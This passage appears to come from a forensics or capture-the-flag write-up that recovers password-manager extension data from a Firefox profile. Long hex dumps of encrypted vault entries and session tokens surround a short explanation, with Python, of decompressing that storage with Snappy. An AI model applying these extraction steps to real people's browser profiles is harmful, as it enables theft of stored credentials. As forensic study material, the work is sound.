65726C696D2EFC010198000A0D98000E3AF80431080C62696E6701551188117008686F7432CA0311901138086C6976056B3E88001C6D6963726F736F6625CDC960256011E0086D736E016F0E300B051831B00EF10818706F72742E6E65C570317811901077696E646F29B301FF0000414821B81EC01B15783A8102517831C0106F6666696305BA0547000031B8314809200833363505A6040000314031C815680EED151D48000B2D6831200C78626F780143000C0D1895E8047A752E37000E180B05C80010917809E832270021C811603E600211580875613291E3050131D03178047561897131C8311010756E6974657526018C010400FF41301238190920087769668536055B059011D801502EF00231D0006F0EA60B1DEB119011B00C7961686FAD93150101E8000D0D803E580031A01C7A6F6E65616C617269F699E011780120086C616265DC11590158610041303E580031080C706179702D23050111B0B1600920002D3E1F0405010160000F5AB80051100861766F45F9115811B00C796F7572111C054DAD3000100D5021F82E60017110106469617065DD951158117004736F894901F001F8510804776165EF9540113008796F79258F4160013031702062656175747962617241CD000012E80E052011380863617312F80871B0D1C82461667465727363686F6F497871B011380076CDA771A0311014626F6F6B776F35DF75A01138086C6F6FC5A47198F1E801500C6D61726BC946214649A800112D4821082E480171702831383030636F6E746163744534314811C83A1F00055921F000120D5800133A580551500C616D617A29F2053335A031581920042E620E010E01A0217871200D200061011C0101B1683A2000046361011DBD6831480D400C636F2E7512D80BD1E84A80000C61750000B5704A200000620E850F31C04A2000086D78000ED40E49184A200000740140B1683AC000006411E031D03A20001A5E110000B5603A20000066015C010191903A2000229D0C91583E2000C56D0400000E78224E8001006E0ECC11010171E03A40000070112071B03A2000007331A051883E2000310051503E20000067017D0D0141784170412841102ED00271E00063C97755702E1800E15B516851E024636F78627573696E657345FF056A016800142DD001302E6800F57018796E6F72746F6E1A780A8D1E59E871080926151F0501016000155A600091E00C766572692E410371983E200001D41101015800167A58001472616B757465199111583128046275266409015000175A500071681873697269757378D18F15503100092046000100180D58A1702E60011E980C0065A556465000106F7269676919BF35D071781C706C6179346672651E9B08412841301E002234746962657269756D616C6C69616E2E0A09A93000195A980011601C33377369676E616C11D3314031100ED0120863616D16C50A2AB00BB1A81120046871291411A011201C6869676872697365112001012188001A0D9801302E3001B1C824737465616D706F77657216CE0811981EB80905200C636F6D6D0ED10839E33540118005280C67616D6511E12D18001B0D803E1003D1981C63686172742E696F117851A805180069E55B014B050101D0001C5A5000719818676F746F6D65650EFD132529115811F01463697472697836ED0A0158001D5A5800119014676F676F6169F1CE59601158012018696E666C69676875D50158001E5A580091B00C6D797371E9EA090111B071080C6F72616332E10F2D58001F5A580051500C646973630E4C0A25054AB00011200E9C0E112401B000205A580071E8186463752E6F726715A851000C6463752D2D56011F0501015000210D503E80021138346865616C7468636172652E676F7639585180346375696461646F646573616C756409240101415061A0119808636D73151D017800220D7801282EF80231780C706570632E5E02317822B80A1C6570636F686F6C640E9D1631210D01016000235A600071F02063656E7475727932310D3C116031A00432312D2E128E130901015800240D583E3001518814636F6D636173556315583E2000B1E0210021281120107866696E692EC9034D5000250D7801302E3001D1B82C637269636B6574776972656C2EF40611D871800861696F42240001D800265A60003130106D616E64740E09112D11115831E0086D74620D1AA97000275A500011E80C64726F701A4B0E01E315505178086765743E230005A800285A580031B818736E617066697322EA1011A8117819201EC208095800290D583EB806113814616C69626162CDBD7DB011B018616C6965787072357B21A821D8912810616C697975DDE041400120F118006E0EE10B1ABC162190002A0D9001482EF00131C8E11004737412C718257811E81E501A2C736F6E79656E74657274616912A619146E6574776F7231BF05010168002B0D680E480B2E6800B138246D65726361646F6C697616DF0F116851783E200016560B000035004248000062094831004248000D20042E6116020B2190212862280012A60B090101D0002C0DD03E380131C8147A656E646573390711D091780C7A6F706922F5080D010158002D5A580051780E88292E5900115871400C74696E6B254B25AE09010158002E0D580E880C2E80011138107261696C6E29E700720ED00C3E58001D2012740C01F8213051280120002D0D4181CB31784A60000067217231704A200000750E171B4128016051F810747275636B0D6001811E300F31F8187472617669616E327A0801F8002F0DF801B02EF80031881C777063752E636F6F16AE2E46200401203EA20501580E381C01A001E82E580011B01C6D6174686C6574691E61183150D15836200016440E010101A8015811D83228001A8C0E018000315AD800F130E5D804756EB14B002E12551F4AE0000C74656C65AD6F1524016000325A60009148006D1AD01211D891800C7869616F111C1101015000335A5000713020706F7374657061792E1A520E11581E200A05200D1D015000345A500071280C666163650E0C11458D1DF85170206D657373656E6765721121ADA000350D583ED801113808736B791268151E0C0811A831000C736B7962A163006FC96F35D0119818736B7976656761113F050101D000360D7841F82E50021E781F446469736E65796D6F76696573616E7977686589E0118031981EC51451481198094019ED01E04168316008646164124D08719851C8093808706C751DB201B000370DB001682EB000113820706F6B656D6F6E2D671AD50A11A839F0052019912D8000385A580011A8086D797512CE18115011180875767661C8257601A000395A480071F8086D64731A5A130901115031E810696D6564690E0D341DA20158003A5A580071B0614C102D7961686101A6082E696C115871980120146861706F616CA5FF002E719801010160003B5A600011B80E41153D8B15B831080C73686C641EF5090150003C7A50000878696132AF0311B0513808616C69619655D0010101580E952241403E000211380C62656C6B2E680F1158510014736565646F6E759F05010158003E5AB000714018747572626F7461121C1801351158117810696E74756945CA011E09010158003F5A5800159010686F706966792111585110046D793E220016D00900400D580EE8102E0803319008656261055511501EC80A051804617475A832180004626575A0321800046361F5383618000068F530361800006EF528312005780C636F2E6ACDF10E100821C83E200000741A9D3100080DE03E200016161526601631480D60D5D21E98144220000068125715229814422000006D166B231E98144220001ADA131E981442200004747725FD1EB818321801046465229014321800046573228814321800046672228014321800046965227814361800046E001E681436180000740EB0262570321800086E6C001ED013321800087068001E901336180016361541D800412DA03E88037530086563682EC7045188313019202DF14DD800425A58005108107363687761268B0D1558D100092008706C61BDE301B000435A580000091AC01B0C7465736C2E740511B01E680A05200C6D6F746FBD06015800440D58C1C02E880322700912C130147374616E6C65659101E92A18081E703832280008636C690EA625046572A1CD09322168613000140DB01073746F636B01E70063167227B12AF160F198006DBDB501B000450DB001502EB0003160107461786163154E3960D1680920369A0A015800460D583EF81A95C81C6564696177696B691A9F1131601120011B0E380900730D2001A001F05150012045501ADE1111E82E400005640D2121903E4000123C200D400EF00801202E4000007001A40D211EE80B2E20001071756F74650D2091C0517801A010736F7572630D2100082D10514001200C766572730EFC1001831E58192E400010766F7961670D4091C01D200EFD2508617279053F0501217800470D680E400A2ED00151D814616972626E62A1F2090131783A200012CC1A010131783A2000224E1031783E200071C631783E2000893A26881C31D80DA00E0C130E9F0D3578462000006912FA3731784A2000125E103178462000006B05603178462000046E7A21003178462000C97A41E04138462000007612131AD138715015E069C7D53851581920161210D1384E20000E200F1ED01A4A20000C626F0000D5484E200021011ED01A4E200021011ED01A4A200000630160D1604A200004656316182D25204A200000670EB41BD1704A2000E59AD1784E200021E10EF00821804A2000006D01601EA0194E2000E1DA1E28194A2000006E0E822B1EB0184A200000700E52131E50184E20004101001C6D904E200001801EE8174A2000125A081EB0174E20000C760000001E78174A200012B01D1E40174E20000E9A081E10173EA00321FC01011EB8163A20000EFB1005011E78163E200016560900000EA82F25A03A200022101E1EE8153A20000066217C01011EA8153E200041BC01011E78153A200012DC1101011E40153E2000217C01011E08153A20000068615C01011E98143A2000006921DC01011E50143E20000E3C1201011EA0133E2000419C01011E68133A20001E170B00001E30133A2000220614002F4D603A200022F01E1E20123E200061BC01011EC0113A20001ADA090400001E80113E200011C01E50113A200012BC130101003456A00022301F0101C1B800480D2861702EB80651B812A82E00620EB241C9BCD1B84A2000C5BCD1B84A2000C5BCD1B84E2000C1BCD1B84E2000C1BC3E30081DA0A5181E30081E2809322000082E6E7AD1B856200008756B082D10F1F0324000006D26F00C1E580A362000C93C0101D1C05E280051E8D1C85A2800C52C0101D1D05A280055981E100D5A2800A51C01013EE0061DC885643EE0062E200081641EB0214AA80185643EE0061D4085643EE0062E200081643EE0061D20C5A01E60214A800085243EE0061D4085043EE0061D2065C43EE0061D2065843EE0061D2065643EE0062E20001E9422618000494D7041982E800331C028737461636B65786368616E2AD22C26100C31001073757065720EA5351A810C71883248000E091E0C666C6F770D24010171901E200B0EED0C086572660EEE300526719071300E90161547086E65743E90031C61736B7562756E741E8D13719015A801D0086170702A0F0D2508004A2D0801B82E08011EE0090C646F63750E3A2105953D004220001EF11C1AC80E004B0D5800085A682610656E7661742A011E91E03110247468656D65666F726573165B2B01A00EF808912024636F646563616E796F6E097A315011F00E8540046F680EED2B0999315011601C617564696F6A756E0E15300122315031701C67726170686963720EB50C01213E50012070686F746F64756E65011D05E4E9F81EE00F1433646F6365610D9D0D014178004C0D2801D02E700111D810783130686F123C35297231181D200070167037092001010158004D0D5821082E580031101C646E736F6D6174691EC32D115811B0146F70656E646E591E01A0217031E814756D6272656C3223100578004E0D78A1002E78001E7815086361670E524742A132118000151AD00F3C63616E61646173776F6E6465726C616E1E481B118811C80C6361726F0E6C2C11AA01F001A81520106564617266262A2231F83140052008706F691EA43231F811201C646F726E657970611E4A1D31F871D0006B0E902014646F6D696E692E272922980D1EF80C0C6B6E6F7422AD182A682851800C6D6961640E8B361E6B2C1E980D11682C7363686C6974746572626168757D2AD82D11B000760E1339007919F1D1D81E28110EDE49007405B50469733D57D5D8119020776F726C64736F66662AC51E4158004F2DE021882EE0011E6815047562294A31D01E781100751AA81A0101014800505A480011C812381B0C726461701A8225115051A00D2059F58D6800510D5841082EA0001EA009146E6574637570E95C010111583A200000651E180801E84150001751980475730ED1243072636F6E74726F6C70616E656C114E01D800520D80C1D82E800051081079616E6465223617D9401EC838047961163C0A117811980D3800611E980C01E001983A200000621ED80B51E871B00D4000631EEA1851E871281520086D2E610E9B0F51E84A200000670EFC0BE12801804A200012780DA1E801203AA0000065013C010151E03A200012940801011EB8093E20000E9408010151D83A2000006BF1D41EA8093E2000314081A04AA0001EF1392298093A4000006C0E740E01011E98093A2000006D1295112A78103A200022580C1E98093A200022380C1E98093A200004746A015D45ECC9603E200021BC01011E98093A200000750EB40F01011E98093E20003120010141D000530D6841902ED0029E7822716091200EA82271B5016000540D6041D02E600011980EA039086F6E2E163D4E7D309128092026E33301A821D8519809200476702E3405017800550D7801302E78009160087562692AFE3379A81E001804756299D1015000565A50001E4008287472616E7366657277697312D32A3E1801111801E4015000570D5061282EA00071D01474616B65617716D41A0134115011C0206A7573742D6561742E12260C26001F4220001A0A0F218021384220006D729150422000122E0E26C8143178246C6965666572616E646FA91E3E50041D2000612E3009D1802C746875697362657A6F7267640E0A0C3E5004147079737A6E6579500101213800582D3801702E380111981861746C61737369220F19313811201062697462750E5A271A571641202118B1C000740EF6082AA80A313811400EA425087573700EB81600690E64103138112019800E660A39387120086A697222771901D011D81108318020617661746172436F6C165B400D0126D83C16400C10436F6E6669B11312803E51C0127C17006F0E4214000012084011180867697412204101010E2040F1C00950011601012668410875746312DC501E20213698402433393A34382E3536305A11B82A484001490D0126403F011101F811780C746F6B651E5D3D0E403F11481861636365737354011E01330800A30316E8355865794A30655841694F694A4B563151694C434A686247630110F09A53557A49314E694A392E65794A75596D59694F6A45324F4445304D4441304D6A6B73496D5634634349364D5459344D5451774E7A59794F53776961584E7A496A6F696148523063446F764C327876593246736147397A644878736232647062694973496E4E3159694936496A4134596A4D334E5446694C5746685A4455744E4459784E6931694D5759334C5441784E57517A596D55334E446C6B59053C6042795A573170645730694F6E527964575573496D356862575501BD08466248016420424B6232356C63794901ACA87459576C73496A6F695A57783361573475616D39755A584E4159323979634739795958526C4C6D6830596919307058335A6C636D6C6D6157566B496A7030636E566C4C434A76636D647664015C8869493657313073496D39795A32466B62576C75496A70625853776962334A6E64584E6C362400583168626D466E5A5849694F6C74644C434A7A63335268622585C04934597A49795A6A67314F5330774E574E6B4C5451314E4441744F5445314D53316C4E54426C5A44526D4E4446684D546321B1186B5A585A70593205F8146B595759325A218C907930304D7A55324C54526A4D6D51744F44646B4E693032596A526B597A6B784E5455794D5425F13C7A593239775A53493657794A6863476B01544C765A6D5A736157356C5832466A5932567A63794A01AC04686205B8F4F20173695158427762476C6A59585270623234695858302E5367594A4D6F69426E755668464D53456C4A30504A647A633731697644384B64586A75596541434E6F69626B45695954626D6771754C67597A6A3569337559704A4B573851347A70544C6468376B6663583838785143524730554B365470515844324B694E3349765445736D676A4F444C6F7A56505F5452454C424377336866674F75696167636F65717A465146486E5A397052573233454B6A4356597449533471743645516A497A2D7A496A4F6C6E4F7A53653352424432394944344D5137377246556E545F733074354F4A70717A4162476C692D7A72747370737A305F68526C697975767079464A4A525431516C332D664638707235555F6955317473542D317568435933744F5F31626C576B3831776B6B6A5A5837354267415839596D4E6B5174475231314E6B5F67313653565953786930516B7242513043466451694B6250744F47685775633734375A644D62665759567700000000000C0000800400FFFF72656672657368546F6B656E00000000580000800400FFFF45745A4F5742584D78385746756350784E5567352D576D2D7571434B2D356835556A62303741543436686A363470317953784D4F62306775734E755F314E75363550474E545965324853335557796E6B546E327335673D3D000000001300FFFF090089301067726F75700EC40D85460901816800101EF00B22285600430EC7270D27B9681668522E1C00010104FFFFD530087970653E1E000E5044D1E81E885700432AD858A1781120086E6F461222583E2000B1B02E105901381118099809AF01180196A1581EB0450ED8520114010101F07EB0001EA00C01380956C9380140015811782E900001581120D1E001401E99472E20001C000000001300FFFF
50040300010104F1FF0106C00800FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200013538100967B4777842000000001300FFFF
380403000101C4F1FF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000
380403000101C4F1FF240000800400FFFF64616636653430372D343335362D346332642D383764362D36623464633931353532313400000000
50040300010124F1FF010000000700FFFF010EEC0300FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000000000001300FFFF
A009040300010104F1FF0106500800FFFF050000800400FFFF7468656D65000000060D101473797374656D19101477696E646F77013600000538010A101300FFFF0C1130287461746556657273696F6E011C20060000000300FFFF0F0D2038656E7669726F6E6D656E7455726C730123054800040D2008626173017F1000310000000190C868007400740070003A002F002F00700061007300730077006F0072006400740065007300740069006E006700730065007200760506082D00630524007005060061052A402E006C006F00630061006C003A003800300502090100030D80086170690911050108FFFF080D181C6964656E746974790517000019181C7765625661756C74111831480C69636F6E09DE010108FFFF0D0D48246E6F746966696361746936200000060D20106576656E74153939582C6B6579436F6E6E6563746F720152090100FF35801140106C6F63616C25421800000100FFFF160D58506E6F4175746F50726F6D707442696F6D65747269630D680128001A722800085465780DE20101013031D01473736F436F6421F20C69666965099B012000190D502473736F4F7267616E697A05F30449642147152A0901013031680C73736F534143011A011811683872656D656D6265726564456D61696C011F000021885178007621851454696D656F7515AA014000120D882E2000044163217E014009010128000A0D2820656E61626C655472612DEA010101200014322000244D696E696D697A65546F2E2A00012800113228000C436C6F733A25002D98362800105374617274364D000D28000B0D50246F70656E41744C6F676919B90170000E0D2034616C7761797353686F77446F636B013E490000180D2009D83442726F77736572496E74656772613106014800237A28002446696E6765727072696E355F0538118008646973213910466176696369FA1800000200FFFF1D0D58006251741D492056616C69646174656409AF30000200FFFF000000001300FFFF

```

#### Decompress Data

Searching for information on Firefox extensions data leads to [this Reddit post](https://www.reddit.com/r/firefox/comments/b5mome/how_can_i_read_the_sqlite_files_of_firefox_addons/):

![image-20240710085019358](/img/image-20240710085019358.png)

It suggests that it’s using Snappy compression.

After some playing around in Python (with the [python-snappy](https://github.com/intake/python-snappy) library), that seems correct. Taking one of the hex blobs and decompressing it works:

```

>>> import snappy
>>> snappy.decompress(bytes.fromhex('50040300010124F1FF010000000700FFFF010EEC0300FFFF240000800400FFFF30386233373531622D616164352D343631362D623166372D30313564336265373439646200000000000000001300FFFF'))
b'\x03\x00\x00\x00\x00\x00\xf1\xff\x01\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff$\x00\x00\x80\x04\x00\xff\xff08b3751b-aad5-4616-b1f7-015d3be749db\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff'

```

It’s not completely obvious what the data format is, but based on that GUID it seems to have worked. However there’s no data that matches the format I was expecting above. If I grab the long first hex blob, data of the expected format does come out:

```

>>> data = bytes.fromhex('90B401040300010104F1FF01063C0800FFFF040000800400FFFF6461746101140101011800070D1818636970686572730117051800090D1820656E63727970746564051A0901013800240D209035353334663661372D313830662D343065302D626630382D656331373537363531646466000937053800020D3800690D51BE4800000E0D40306F7267616E697A6174696F6E490D4C100000FFFF080D2014666F6C646572111A39000C65646974018F20010000000200FFFF0C0D30287669657750617373776F72054E112000130D202E700018557365546F74700147152815781861766F72697465011D2E6000247265766973696F6E4461091C001B0D5868323032332D30342D31335431343A34393A34362E3335373937395A0143000031B8087479700554019800031DD0086E616D051800601150F0612E515246397649435172446548392F70374F30774447673D3D7C674E4A5078354664496639777366727937472F4161413D3D7C4B62303467756A35676E465165645645552F57785953354444504847454975322B5A58673155554E7A41733D05000045480C6E6F7465492E010108FFFF0D0D8014636F6C6C656329961120080700FF458800133D700863726525BC9A1001083830382910000B0D681864656C65746564113F0D01590018726570726F6D7025EC213011B8106C6F67696E0D2E41C831B80C75736572214C3948F05E563261684475674331376844637331445854755349513D3D7C686A6274636835666D53726E517930453544623857513D3D7C553050596C73345963356E53344A6A2F34577736324E7755484A5654574F66734E2F5934525941714F484D3D080DC800704D7400740D1058322E4970683336716D436F6D616973774C623134576C4121A7F05850494B43705A556A55616878495A4459383541336C4733494A7675774E4B37696A4C504930624F7339776F3D7C65787734656A57676A2B4A344A4D765665564E525A4141456C2B41454261397633743246734162724B35303D210F00140D80119000523AB0020901794800746D0100B40D3858322E6C6F557574576F5550377742784475586C502F35452130F09F7353395655656B5534703975656876626B376A6768706E7134386E776858534430364135554C474C7348366C61772F514B6669584D6D597979383638316349575357523750474B752F5570554F49353461785264624F6A39696456485949386A473278415A2F376A6771633D7C764E5A335A39455845372F427830473741686333763636663739736C6F464370515769514A7639684E62343D0000000012000045D0406175746F66696C6C4F6E506167654C6F618506110119F80875726945D7618851D84160012A41505168106D617463680115050108FFFF032D2808757269051239F050466C43544261586278646D7062654F6B63367356562138F05837484B53582F383041735A336B686B41504775364B4C3946727253315374324367736778706241623567343D7C41394638566D7876344E6C4E4B72426B556C6C32346D73373867413977524B4D796333635676496748536F3D058104000065909E0800D128A958250305F07E28063E600031200873656E95202138BE48009108997009940101CE5000910814706F6C69636989DBCE480000192DE871481047656E657285EA18486973746F727901A10D010160010BA118B1402E680611D22E280031281470726F766964F1B209012E280001120158D140086B6579114F052800120DA8E5DE2C6F53796D6D65747269634B651DA1015011703E080879F85050314C7174305378315232435174524E6B4D663566C170F09A65436F4B4B33724C4F4644722B686B454D6E4D5874304A56634871505843756A72475669732B4779773146723145336753632F766D6D68372F47767871355874726D38773151677753312F495051474578656F78667A5067436154354537686933613962363961365641593D7C36356464756D69375773776754305946796A5A2B7041686A7662443038612B467631357634724F345067633D0000211E690000102D082E7801004B2D2C6E0001010101200108216811081E500831A0114C010101305E50010101012001082E5000000A0DA01870726976617465A6A001000616F009F4D706322E78644D5932374D6850326A526D75444F2F526A6478773D3D7C507554436A666A363065583566513834754D59356D363274492F3467384A64383545644F2F3159654652594E3668774B537365564A3378625139314E4C314E66586C4632334F3669744673696F6F63744532557530717A7174717A4B6B304774334C786A4E6558736730774937594873695045633856496A6E41695A34614B66744F4B4C612B4E436B63464E4A4D6E4572713676414448656449487954626975327871343570477530724E587A69353962506E4F7977756E776D5A5732305471594E58614966392B73576F334876666541524A4C66347035397A505A4432533431476D6F75753065634B56427249584D336534662B67635952684371563832456A75726E416872514F74324B695851743375394E6C2F7A44384B645375477A6C56786F63394F445937504941567A56506A6142544A44656F54712F7A5836367A7A3571303931524E49384B564D676A376B4C6630334B705139506A6E6C5A63324A65594F513479576F704C5A3338317431574F476765532F693349623430656B45355344496B3333476A50744D372B63543148463332596C625949396D77454857546E34794D50354D446B5653382B456A5A75375A4F7654636937762F374E307832436F4B30342F423676596E45675A444257687035743366667A4C4575375739384334702B714B46554634786D2B7137484546706639555654584C62626D59524D565732755768306E674147436733597065596E33566B7976354E6D487867302B683250597666316F396A65496154355155526E723257624A62647375735839326C33774A3166513935612F2B7A524F4261635A316D4E4C33517A6F762F626C514A6F6341513830326D4949456F516530586E68463344426E5937506E6F565A5431626778326B614456464C6C4D41436F644D76466134354E7A39314E4234444E656A7A71304D797534564D584C773073663057644E5A3445456B4254556E56445153662F35737A61726D5734486745616B58394941737A50554D59474A4B617151396266355069736170396A5A4F654E4632304263707A78594E5654455A655137574F446D534F346673746248443562734A725238735063553231656B654E466A49686C39433732434357446576474F464974774C4A7035356458312F2F705844646752495A782F442B7A61723558582B41763341674F45794642363555644E6E51655049375546643433612B6B6D4144346E3864584A6B616C3247626842657A386A393851344E303847646A474D39636162586745566E69676550726733376B3859726842434C6D536A4F7A343048685954366B796E316773344E4A55306F6644366534446C39516C2F72373949427163654D756C6E3263554C396B42596852535253387646366975625675566831616D434E4350316B49756E6E2B325A57364F50576C446A56637A656273657869576731746743656B56784C45707345526F2B6830647133397537474C394876306C346E37374964524D73396C42777134446A6A683676524F2B3465714C774C4C787235445833516239794D2F62656F6E6E4D56454F7672384370706F7259727555794D6D776C394F594342704C7768635069503257743475455548766B526E5A7659552B784B74513249483836696A34756B47514E7550694A457A7676375A32336176335A77723169774C565553773843545950646A4E77387975714D455A6B4D4C776E4955324A58553533477258626F464E4755776A6C4551476A376C31506F346847307535564672485141697A55304D61564378444939584A4842566973594475535453477354492B347337347263667858666D64656B6E316A5362586F4378306859332F55375A6779547636704964463155354F4556443475444C314B7178326138316E4B36514477762F636E78544352564B32616F467557716774353762536333424D2F4756777550736F4D746F647A335776714F656C4D504D596B766A5144306D4450314174362F56664D6652304E504E306576746241584F5264787A4F576866492F5444754F506A32534C583649386A6137646A5279307953693173633953547462534365536A4D4D44396F682F496374416A375478355838556635714A594271446A585968396F43595065596B4A4C64356B376B635A6F756C7674646E507059584E647A4666527477517764326173324353494B772B464753506A424B7A364D644B6D684B5A494E4E543076596A67675238355537364862335063777273654E48612B4F4268595034797167634B515A35413D7C374A67516469624278627A3430784E544A4A4857653456384C4E7239457A7A3671452F52617A346F4F676F3D00000000000000001300FFFF0F0000800400FFFF63727970746F4D61737465724B657900E1280EF00FF1500C7075626C3ABF080400012A780E1EC00A0470720EE70B12330FE5700006ED600E000E0E2E101E90109830386233373531622D616164352D343631362D623166372D30313564336265373439646200000022A00F0E3C0E01941E980A20456C77696E204A6F6E164B0A00001EF80A1C656D61696C0000001E280A00650128042E6A01283040636F72706F726174652E6874055D04000022980D486861735072656D69756D506572736F6E616C6C12AA090E880C0E68101E400A106B646649741A720A0EF10908C0270912A00C3128146B64664D656D36880A21481E5811346B6466506172616C6C656C69736D0182010100FF35400C6B6466541A8B1005583158206B657948617368002C2D50C037344537316F505A4939764E6E6F45534E6B754C6C6144546C6B317A412F6348356C35584E4F4C4F6334773D000000000D0D3825201456657269666912741211E01EA8093C757365734B6579436F6E6E6563746F72019E2100001C0D403C636F6E766572744163636F756E74546F3E2C000901262810206C61737453796E63180D402E901130353A34303A32372E3533335A1A0D2039881046726F6D4F2A8612095A01012E78021E580C1873657474696E6721934578000F0D5034656E7669726F6E6D656E7455726C051F052000040D2008626173455800310D1018687474703A2F2F1E5F0C0874657305571465727665722D5941246C6F63616C3A383030300191000021AC16100A04617016800E09013908186964656E7469744554411051B00869636F4548090126E811186E6F746966696312DA0C09B6010100FF7550106576656E7415191968187765625661756C12981101681E300B006B3AD40109014638122070696E50726F7465632A93140E380B51E03EA80C008865A4F0C2FFFF32002E004400580047006400530061004E00380074004C0071003500740053005900580031004A0030005A00440067003D003D007C003400750058004C006D0052004E0070002F0064004A0067004500340031004D0059005600780071002B006E00760064006100750069006E007500300059004B00320065004B006F004D007600410045006D0076004A00380041004A003900440062006500780065007700720067006800580077006C00420076003900700052007C005500630042007A006905A4F0497500430069004A007000700035004D004F0052004200670048007600520032006D00560067007800330069006C007000510068004E0074007A004E004A0041007A00660034004D003D0021600E680C1E080E007621952054696D656F757441630EC01301222680140C6C6F636B011231B02E3000011804FFFF0EE410265015007031A50050226F1325F05E100300114DA0286571756976616C656E74440E0113555C0859000032701100023A100091C034616D65726974726164652E636F6DC10441FC00FF95400474643E220016080E81680EC81100043A580011981462616E6B6F66053C046361095B0501113811D808626F66051F01A001501118086D626E05180E981701181ED80D1475736563666F1D510D90114001302E6812113814737072696E7419381188D1080920087063730D2311501140146E657874656C0D1D0D014110017001A001082E7800D1D814796F757475622D5D00003960115810676F6F676C191F157871A00067E10036770005782178017801A82E78001138086170702E570015F011781469636C6F756436590001D000054D003ED00051302077656C6C73666172672D8431481E18080477660954019801A000164DA819381861647669736F7231692DC000065A780031A01C6D796D657272696C310C3E7800006D0D191178D1300D3608656467396501E800070D7001F02E400151C0046163E511106F6E6C696E193A394851A80C6369746901F2117871F001186104011C01E42150211011D001200C63617264310731D09160012001404281002D3000080DC001C82EC0001598046E6545EE312831F80118047476119659701E980808636F6D051D11B011D018646F776E6C6F61553211B01170086E657705CB215001E81170147365617263680553050131E811200475702E5600090121A000090DE001682EE00031201C62616E616E61726516C80A196011F011D008676170051D31A07198186F6C646E617679051C010111F031A01C70697065726C696D2EFC010198000A0D98000E3AF80431080C62696E6701551188117008686F7432CA0311901138086C6976056B3E88001C6D6963726F736F6625CDC960256011E0086D736E016F0E300B051831B00EF10818706F72742E6E65C570317811901077696E646F29B301FF0000414821B81EC01B15783A8102517831C0106F6666696305BA0547000031B8314809200833363505A6040000314031C815680EED151D48000B2D6831200C78626F780143000C0D1895E8047A752E37000E180B05C80010917809E832270021C811603E600211580875613291E3050131D03178047561897131C8311010756E6974657526018C010400FF41301238190920087769668536055B059011D801502EF00231D0006F0EA60B1DEB119011B00C7961686FAD93150101E8000D0D803E580031A01C7A6F6E65616C617269F699E011780120086C616265DC11590158610041303E580031080C706179702D23050111B0B1600920002D3E1F0405010160000F5AB80051100861766F45F9115811B00C796F7572111C054DAD3000100D5021F82E60017110106469617065DD951158117004736F894901F001F8510804776165EF9540113008796F79258F4160013031702062656175747962617241CD000012E80E052011380863617312F80871B0D1C82461667465727363686F6F497871B011380076CDA771A0311014626F6F6B776F35DF75A01138086C6F6FC5A47198F1E801500C6D61726BC946214649A800112D4821082E480171702831383030636F6E746163744534314811C83A1F00055921F000120D5800133A580551500C616D617A29F2053335A031581920042E620E010E01A0217871200D200061011C0101B1683A2000046361011DBD6831480D400C636F2E7512D80BD1E84A80000C61750000B5704A200000620E850F31C04A2000086D78000ED40E49184A200000740140B1683AC000006411E031D03A20001A5E110000B5603A20000066015C010191903A2000229D0C91583E2000C56D0400000E78224E8001006E0ECC11010171E03A40000070112071B03A2000007331A051883E2000310051503E20000067017D0D0141784170412841102ED00271E00063C97755702E1800E15B516851E024636F78627573696E657345FF056A016800142DD001302E6800F57018796E6F72746F6E1A780A8D1E59E871080926151F0501016000155A600091E00C766572692E410371983E200001D41101015800167A58001472616B757465199111583128046275266409015000175A500071681873697269757378D18F15503100092046000100180D58A1702E60011E980C0065A556465000106F7269676919BF35D071781C706C6179346672651E9B08412841301E002234746962657269756D616C6C69616E2E0A09A93000195A980011601C33377369676E616C11D3314031100ED0120863616D16C50A2AB00BB1A81120046871291411A011201C6869676872697365112001012188001A0D9801302E3001B1C824737465616D706F77657216CE0811981EB80905200C636F6D6D0ED10839E33540118005280C67616D6511E12D18001B0D803E1003D1981C63686172742E696F117851A805180069E55B014B050101D0001C5A5000719818676F746F6D65650EFD132529115811F01463697472697836ED0A0158001D5A5800119014676F676F6169F1CE59601158012018696E666C69676875D50158001E5A580091B00C6D797371E9EA090111B071080C6F72616332E10F2D58001F5A580051500C646973630E4C0A25054AB00011200E9C0E112401B000205A580071E8186463752E6F726715A851000C6463752D2D56011F0501015000210D503E80021138346865616C7468636172652E676F7639585180346375696461646F646573616C756409240101415061A0119808636D73151D017800220D7801282EF80231780C706570632E5E02317822B80A1C6570636F686F6C640E9D1631210D01016000235A600071F02063656E7475727932310D3C116031A00432312D2E128E130901015800240D583E3001518814636F6D636173556315583E2000B1E0210021281120107866696E692EC9034D5000250D7801302E3001D1B82C637269636B6574776972656C2EF40611D871800861696F42240001D800265A60003130106D616E64740E09112D11115831E0086D74620D1AA97000275A500011E80C64726F701A4B0E01E315505178086765743E230005A800285A580031B818736E617066697322EA1011A8117819201EC208095800290D583EB806113814616C69626162CDBD7DB011B018616C6965787072357B21A821D8912810616C697975DDE041400120F118006E0EE10B1ABC162190002A0D9001482EF00131C8E11004737412C718257811E81E501A2C736F6E79656E74657274616912A619146E6574776F7231BF05010168002B0D680E480B2E6800B138246D65726361646F6C697616DF0F116851783E200016560B000035004248000062094831004248000D20042E6116020B2190212862280012A60B090101D0002C0DD03E380131C8147A656E646573390711D091780C7A6F706922F5080D010158002D5A580051780E88292E5900115871400C74696E6B254B25AE09010158002E0D580E880C2E80011138107261696C6E29E700720ED00C3E58001D2012740C01F8213051280120002D0D4181CB31784A60000067217231704A200000750E171B4128016051F810747275636B0D6001811E300F31F8187472617669616E327A0801F8002F0DF801B02EF80031881C777063752E636F6F16AE2E46200401203EA20501580E381C01A001E82E580011B01C6D6174686C6574691E61183150D15836200016440E010101A8015811D83228001A8C0E018000315AD800F130E5D804756EB14B002E12551F4AE0000C74656C65AD6F1524016000325A60009148006D1AD01211D891800C7869616F111C1101015000335A5000713020706F7374657061792E1A520E11581E200A05200D1D015000345A500071280C666163650E0C11458D1DF85170206D657373656E6765721121ADA000350D583ED801113808736B791268151E0C0811A831000C736B7962A163006FC96F35D0119818736B7976656761113F050101D000360D7841F82E50021E781F446469736E65796D6F76696573616E7977686589E0118031981EC51451481198094019ED01E04168316008646164124D08719851C8093808706C751DB201B000370DB001682EB000113820706F6B656D6F6E2D671AD50A11A839F0052019912D8000385A580011A8086D797512CE18115011180875767661C8257601A000395A480071F8086D64731A5A130901115031E810696D6564690E0D341DA20158003A5A580071B0614